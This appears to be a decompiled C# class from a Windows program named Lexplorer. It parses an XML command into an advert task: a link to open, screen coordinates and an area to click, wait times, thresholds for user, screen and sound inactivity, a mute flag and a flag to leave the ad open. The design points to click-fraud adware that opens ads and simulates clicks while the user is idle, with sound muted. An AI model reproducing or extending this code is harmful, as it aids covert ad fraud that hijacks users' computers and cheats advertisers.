using System;
using System.Drawing;
using System.Xml;

namespace Lexplorer;

internal class Class1
{
	private string _link;

	private int _relX;

	private int _relY;

	private int _nextTimeCheck;

	private AdvertActions _action;

	private int _width;

	private int _height;

	private int _waitBefore;

	private int _waitAfter;

	private bool _relative;

	private bool _makeClick;

	private bool _doubleClose;

	public bool ShowAd { get; set; }

	public int AllowedUserInactivityPeriod { get; set; }

	public int AllowedScreenInactivityPeriod { get; set; }

	public int AllowedSoundInactivityPeriod { get; set; }

	public bool SoundOff { get; set; }

	public bool LeaveAdOpen { get; set; }

	public bool CloseOnlyFirstTab => _doubleClose;

	public bool MakeClick => _makeClick;

	public bool RelativePosition => _relative;

	public int NextTimeCheck => _nextTimeCheck;

	public string Link => _link;

	public int RelativeX => _relX;

	public AdvertActions Action => _action;

	public int WaitBeforeLoad => _waitBefore;

	public int WaitAfterClick => _waitAfter;

	public int RelativeY => _relY;

	public int Width => _width;

	public int Height => _height;

	public Class1(string link, int relativeX, int relativeY, int nextTimeCheck, AdvertActions act, Size size, int waitForLinkLoad, int waitAfterClick, bool relativePosition, bool makeClick, bool doubleClose)
	{
		_link = link;
		_relX = relativeX;
		_relY = relativeY;
		_nextTimeCheck = nextTimeCheck;
		_action = act;
		_width = size.Width;
		_height = size.Height;
		_waitBefore = waitForLinkLoad;
		_waitAfter = waitAfterClick;
		_relative = relativePosition;
		_makeClick = makeClick;
		_doubleClose = doubleClose;
	}

	public static Class1 FromXml(string strXml)
	{
		try
		{
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml(strXml);
			XmlNode xmlNode = xmlDocument.SelectSingleNode("//body");
			if (xmlNode == null)
			{
				return null;
			}
			XmlNode xmlNode2 = xmlNode["nextTime"];
			if (xmlNode2 == null)
			{
				return null;
			}
			int nextTimeCheck = Convert.ToInt32(xmlNode2.InnerText);
			xmlNode2 = xmlNode["makeClick"];
			if (xmlNode2 == null)
			{
				return null;
			}
			int num = Convert.ToInt32(xmlNode2.InnerText);
			AdvertActions act = ((num <= 0) ? AdvertActions.OnlyOpen : AdvertActions.OpenAndClick);
			xmlNode2 = xmlNode["waitForLinkReload"];
			if (xmlNode2 == null)
			{
				return null;
			}
			int waitForLinkLoad = Convert.ToInt32(xmlNode2.InnerText);
			xmlNode2 = xmlNode["pointX"];
			if (xmlNode2 == null)
			{
				return null;
			}
			int relativeX = Convert.ToInt32(xmlNode2.InnerText);
			xmlNode2 = xmlNode["pointY"];
			if (xmlNode2 == null)
			{
				return null;
			}
			int relativeY = Convert.ToInt32(xmlNode2.InnerText);
			xmlNode2 = xmlNode["clickAreaX"];
			if (xmlNode2 == null)
			{
				return null;
			}
			int width = Convert.ToInt32(xmlNode2.InnerText);
			xmlNode2 = xmlNode["clickAreaY"];
			if (xmlNode2 == null)
			{
				return null;
			}
			int height = Convert.ToInt32(xmlNode2.InnerText);
			xmlNode2 = xmlNode["waitAfterClick"];
			if (xmlNode2 == null)
			{
				return null;
			}
			int waitAfterClick = Convert.ToInt32(xmlNode2.InnerText);
			xmlNode2 = xmlNode["link"];
			if (xmlNode2 == null)
			{
				return null;
			}
			string innerText = xmlNode2.InnerText;
			xmlNode2 = xmlNode["relativeAd"];
			if (xmlNode2 == null)
			{
				return null;
			}
			bool relativePosition = ((xmlNode2.InnerText == "1") ? true : false);
			xmlNode2 = xmlNode["makeClick"];
			if (xmlNode2 == null)
			{
				return null;
			}
			bool makeClick = ((xmlNode2.InnerText == "1") ? true : false);
			xmlNode2 = xmlNode["clickOpenWindow"];
			if (xmlNode2 == null)
			{
				return null;
			}
			bool doubleClose = ((xmlNode2.InnerText == "1") ? true : false);
			Class1 @class = new Class1(innerText, relativeX, relativeY, nextTimeCheck, act, new Size(width, height), waitForLinkLoad, waitAfterClick, relativePosition, makeClick, doubleClose);
			xmlNode2 = xmlNode["active"];
			if (xmlNode2 == null)
			{
				return null;
			}
			@class.ShowAd = ((xmlNode2.InnerText == "1") ? true : false);
			xmlNode2 = xmlNode["userActive"];
			if (xmlNode2 == null)
			{
				return null;
			}
			@class.AllowedUserInactivityPeriod = int.Parse(xmlNode2.InnerText);
			xmlNode2 = xmlNode["screenActive"];
			if (xmlNode2 == null)
			{
				return null;
			}
			@class.AllowedScreenInactivityPeriod = int.Parse(xmlNode2.InnerText);
			xmlNode2 = xmlNode["soundActive"];
			if (xmlNode2 == null)
			{
				return null;
			}
			@class.AllowedSoundInactivityPeriod = int.Parse(xmlNode2.InnerText);
			xmlNode2 = xmlNode["soundOff"];
			if (xmlNode2 == null)
			{
				return null;
			}
			@class.SoundOff = ((xmlNode2.InnerText == "1") ? true : false);
			xmlNode2 = xmlNode["leaveAdOpen"];
			if (xmlNode2 == null)
			{
				return null;
			}
			@class.LeaveAdOpen = ((xmlNode2.InnerText == "1") ? true : false);
			return @class;
		}
		catch
		{
			return null;
		}
	}
}
